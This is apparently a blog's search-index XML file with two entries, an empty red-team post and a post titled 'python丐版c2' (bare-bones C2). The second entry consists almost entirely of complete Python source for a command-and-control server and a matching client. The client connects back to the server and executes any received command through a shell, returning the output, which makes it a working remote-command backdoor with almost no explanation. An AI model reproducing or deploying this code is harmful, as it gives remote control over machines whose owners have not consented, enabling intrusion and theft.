<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ATT&amp;CK红队2</title>
    <url>/2024/12/07/ATT&amp;CK%E7%BA%A2%E9%98%9F2/ATT&amp;CK%E7%BA%A2%E9%98%9F2/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>python丐版c2</title>
    <url>/2024/12/07/python%E4%B8%90%E7%89%88c2/python%E4%B8%90%E7%89%88c2/</url>
    <content><![CDATA[<h1 id="服务端："><a href="#服务端：" class="headerlink" title="服务端："></a>服务端：</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from socket import *</span><br><span class="line">from threading import Thread, Lock</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"># 配置</span><br><span class="line">IP = &#x27;0.0.0.0&#x27;</span><br><span class="line">PORT = 50000</span><br><span class="line">BUFLEN = 4096</span><br><span class="line"></span><br><span class="line"># 共享资源</span><br><span class="line">id_counter = 1  # 客户端编号</span><br><span class="line">clients = []  # 存储已连接客户端的信息</span><br><span class="line">Flag = True  # 服务端运行状态</span><br><span class="line">lock = Lock()  # 线程锁，保护共享资源</span><br><span class="line"># 客户端处理函数</span><br><span class="line">def handle_client(dataSocket, addr, cid):</span><br><span class="line">    &quot;&quot;&quot;处理单个客户端的通信&quot;&quot;&quot;</span><br><span class="line">    global clients</span><br><span class="line">    print(f&quot;客户端连接：&#123;addr&#125;，编号：&#123;cid&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            recved = dataSocket.recv(BUFLEN)</span><br><span class="line">            if not recved:</span><br><span class="line">                print(f&quot;客户端 &#123;cid&#125; 已断开&quot;)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">            recved_decoded = recved.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)</span><br><span class="line">            print(f&quot;收到客户端 &#123;cid&#125; 的数据：&#123;recved_decoded&#125;&quot;)</span><br><span class="line"></span><br><span class="line">            # 回应客户端</span><br><span class="line">            dataSocket.send(f&quot;服务端回应：&#123;recved_decoded&#125;&quot;.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;处理客户端 &#123;cid&#125; 时出错：&#123;e&#125;&quot;)</span><br><span class="line">    finally:</span><br><span class="line">        # 移除断开连接的客户端</span><br><span class="line">        with lock:</span><br><span class="line">            clients = [client for client in clients if client[&#x27;id&#x27;] != cid]</span><br><span class="line">        dataSocket.close()</span><br><span class="line">        print(f&quot;客户端 &#123;cid&#125; 的线程已终止&quot;)</span><br><span class="line"># 监听函数</span><br><span class="line">def listen():</span><br><span class="line">    &quot;&quot;&quot;监听客户端连接并创建线程处理&quot;&quot;&quot;</span><br><span class="line">    global Flag</span><br><span class="line">    listenSocket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    listenSocket.bind((IP, PORT))</span><br><span class="line">    listenSocket.listen(5)</span><br><span class="line">    print(f&#x27;服务端已启动，正在监听 &#123;PORT&#125; 端口&#x27;)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        while Flag:</span><br><span class="line">            listenSocket.settimeout(1)  # 设置超时以检查退出标志</span><br><span class="line">            try:</span><br><span class="line">                dataSocket, addr = listenSocket.accept()</span><br><span class="line">            except timeout:</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            with lock:</span><br><span class="line">                global id_counter</span><br><span class="line">                cid = id_counter</span><br><span class="line">                id_counter += 1</span><br><span class="line">                clients.append(&#123;&#x27;id&#x27;: cid, &#x27;addr&#x27;: addr, &#x27;socket&#x27;: dataSocket&#125;)</span><br><span class="line"></span><br><span class="line">            # 为每个客户端创建单独线程处理</span><br><span class="line">            client_thread = Thread(target=handle_client, args=(dataSocket, addr, cid))</span><br><span class="line">            client_thread.daemon = True  # 守护线程</span><br><span class="line">            client_thread.start()</span><br><span class="line">    finally:</span><br><span class="line">        listenSocket.close()</span><br><span class="line"># 查看连接情况</span><br><span class="line">def client_list():</span><br><span class="line">    &quot;&quot;&quot;打印当前已连接的客户端列表&quot;&quot;&quot;</span><br><span class="line">    print(&#x27;当前已连接的客户端：&#x27;)</span><br><span class="line">    with lock:</span><br><span class="line">        if not clients:</span><br><span class="line">            print(&quot;没有已连接的客户端&quot;)</span><br><span class="line">        for client in clients:</span><br><span class="line">            print(f&quot;编号：&#123;client[&#x27;id&#x27;]&#125;，地址：&#123;client[&#x27;addr&#x27;]&#125;&quot;)</span><br><span class="line"># 关闭连接</span><br><span class="line">def close_client(cid):</span><br><span class="line">    &quot;&quot;&quot;关闭指定客户端的连接&quot;&quot;&quot;</span><br><span class="line">    global clients</span><br><span class="line">    with lock:</span><br><span class="line">        target_client = next((client for client in clients if client[&#x27;id&#x27;] == cid), None)</span><br><span class="line">        if target_client:</span><br><span class="line">            try:</span><br><span class="line">                target_client[&#x27;socket&#x27;].close()</span><br><span class="line">                clients = [client for client in clients if client[&#x27;id&#x27;] != cid]</span><br><span class="line">                print(f&quot;客户端 &#123;cid&#125; 已关闭&quot;)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                print(f&quot;关闭客户端 &#123;cid&#125; 时出错：&#123;e&#125;&quot;)</span><br><span class="line"># 发送命令模块</span><br><span class="line">def cmd():</span><br><span class="line">    &quot;&quot;&quot;向指定客户端发送命令&quot;&quot;&quot;</span><br><span class="line">    while True:</span><br><span class="line">        if not clients:</span><br><span class="line">            print(&quot;当前没有已连接的客户端！&quot;)</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">        # 列出已连接客户端</span><br><span class="line">        print(&quot;当前已连接的客户端：&quot;)</span><br><span class="line">        with lock:</span><br><span class="line">            for client in clients:</span><br><span class="line">                print(f&quot;编号：&#123;client[&#x27;id&#x27;]&#125;，地址：&#123;client[&#x27;addr&#x27;]&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        # 选择客户端</span><br><span class="line">        try:</span><br><span class="line">            target_id = int(input(&quot;输入目标客户端编号（输入0返回主菜单）：&quot;))</span><br><span class="line">            if target_id == 0:</span><br><span class="line">                return</span><br><span class="line">        except ValueError:</span><br><span class="line">            print(&quot;请输入有效的编号！&quot;)</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        # 查找目标客户端</span><br><span class="line">        with lock:</span><br><span class="line">            target_client = next((client for client in clients if client[&#x27;id&#x27;] == target_id), None)</span><br><span class="line">        if not target_client:</span><br><span class="line">            print(f&quot;客户端 &#123;target_id&#125; 不存在，请重新选择！&quot;)</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        # 发送命令</span><br><span class="line">        try:</span><br><span class="line">            command = input(f&quot;向客户端 &#123;target_id&#125; 发送命令（输入&#x27;back&#x27;返回主菜单）：&quot;)</span><br><span class="line">            if command.lower() == &#x27;back&#x27;:</span><br><span class="line">                return</span><br><span class="line"></span><br><span class="line">            target_client[&#x27;socket&#x27;].send(command.encode(&#x27;utf-8&#x27;))</span><br><span class="line"></span><br><span class="line">            # 如果命令为 exit，则关闭该客户端</span><br><span class="line">            if command.lower() == &#x27;exit&#x27;:</span><br><span class="line">                close_client(target_id)</span><br><span class="line">                return</span><br><span class="line"></span><br><span class="line">            # 接收客户端的响应</span><br><span class="line">            response = target_client[&#x27;socket&#x27;].recv(BUFLEN).decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)</span><br><span class="line">            print(f&quot;客户端 &#123;target_id&#125; 响应：&#123;response&#125;&quot;)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(f&quot;与客户端 &#123;target_id&#125; 通信时出错：&#123;e&#125;&quot;)</span><br><span class="line">            return</span><br><span class="line"># 关闭服务</span><br><span class="line">def close_all_clients():</span><br><span class="line">    &quot;&quot;&quot;关闭所有客户端连接&quot;&quot;&quot;</span><br><span class="line">    global clients</span><br><span class="line">    with lock:</span><br><span class="line">        for client in clients:</span><br><span class="line">            try:</span><br><span class="line">                client[&#x27;socket&#x27;].close()</span><br><span class="line">            except Exception as e:</span><br><span class="line">                print(f&quot;关闭客户端 &#123;client[&#x27;id&#x27;]&#125; 时出错：&#123;e&#125;&quot;)</span><br><span class="line">        clients = []</span><br><span class="line"></span><br><span class="line">def menu():</span><br><span class="line">    &quot;&quot;&quot;显示服务端菜单&quot;&quot;&quot;</span><br><span class="line">    print(&quot;\n-----------------------------------&quot;)</span><br><span class="line">    print(&#x27;1. 查看已连接的客户端&#x27;)</span><br><span class="line">    print(&#x27;2. 向指定客户端发送命令&#x27;)</span><br><span class="line">    print(&#x27;3. 退出并关闭服务端&#x27;)</span><br><span class="line"></span><br><span class="line"># 启动监听线程</span><br><span class="line">listener_thread = Thread(target=listen)</span><br><span class="line">listener_thread.start()</span><br><span class="line"></span><br><span class="line"># 服务端主控制循环</span><br><span class="line">try:</span><br><span class="line">    while True:</span><br><span class="line">        menu()</span><br><span class="line">        try:</span><br><span class="line">            choice = int(input(&quot;输入选择：&quot;))</span><br><span class="line">            if choice == 1:</span><br><span class="line">                client_list()</span><br><span class="line">            elif choice == 2:</span><br><span class="line">                cmd()</span><br><span class="line">            elif choice == 3:</span><br><span class="line">                print(&quot;正在关闭所有客户端和服务端...&quot;)</span><br><span class="line">                close_all_clients()</span><br><span class="line">                Flag = False  # 停止监听线程</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;请输入有效的选项！&quot;)</span><br><span class="line">        except ValueError:</span><br><span class="line">            print(&quot;请输入数字选项！&quot;)</span><br><span class="line">finally:</span><br><span class="line">    # 等待监听线程退出</span><br><span class="line">    listener_thread.join()</span><br><span class="line">    print(&quot;服务端已成功退出&quot;)</span><br></pre></td></tr></table></figure>
<h1 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from socket import *</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">IP = &#x27;127.0.0.1&#x27;</span><br><span class="line">PORT = 50000</span><br><span class="line">BUFLEN = 4096</span><br><span class="line"></span><br><span class="line">dataSocket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">dataSocket.connect((IP, PORT))</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    while True:</span><br><span class="line">        # 接收命令</span><br><span class="line">        recved = dataSocket.recv(BUFLEN)</span><br><span class="line">        if not recved:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        command = recved.decode(&#x27;utf-8&#x27;).strip()</span><br><span class="line"></span><br><span class="line">        # 判断是否是&#x27;cd&#x27;命令</span><br><span class="line">        if command.startswith(&quot;cd &quot;):</span><br><span class="line">            try:</span><br><span class="line">                target_dir = command[3:].strip()</span><br><span class="line">                os.chdir(target_dir)  # 执行目录变化</span><br><span class="line">                response = f&quot;Changed directory to &#123;os.getcwd()&#125;&quot;</span><br><span class="line">            except Exception as e:</span><br><span class="line">                response = f&quot;Error changing directory: &#123;str(e)&#125;&quot;</span><br><span class="line">        else:</span><br><span class="line">            # 执行其他命令</span><br><span class="line">            try:</span><br><span class="line">                from subprocess import Popen, PIPE</span><br><span class="line">                process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)</span><br><span class="line">                output, errors = process.communicate()</span><br><span class="line"></span><br><span class="line">                # 解码输出内容</span><br><span class="line">                output_decoded = output.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) if output else &quot;No output.&quot;</span><br><span class="line"></span><br><span class="line">                response = f&quot;Output:\n&#123;output_decoded&#125;\n&quot;.strip()</span><br><span class="line">            except Exception as e:</span><br><span class="line">                response = f&quot;Command execution error: &#123;str(e)&#125;&quot;</span><br><span class="line"></span><br><span class="line">        # 发送命令执行结果给服务端</span><br><span class="line">        dataSocket.send(response.encode(&#x27;utf-8&#x27;)[:BUFLEN])</span><br><span class="line"></span><br><span class="line">finally:</span><br><span class="line">    dataSocket.close()</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
</search>
